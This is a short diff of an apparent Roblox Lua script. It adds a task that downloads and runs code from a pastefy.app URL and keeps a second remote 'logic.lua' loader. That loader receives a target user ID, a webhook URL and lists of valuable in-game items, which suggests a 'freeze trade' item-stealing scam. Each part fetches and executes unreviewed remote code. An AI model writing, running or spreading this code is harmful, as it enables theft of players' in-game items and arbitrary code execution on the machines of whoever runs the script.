@@ -346,10 +346,10 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
+end)
 
-    task.wait(1)
-
+task.spawn(function()
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
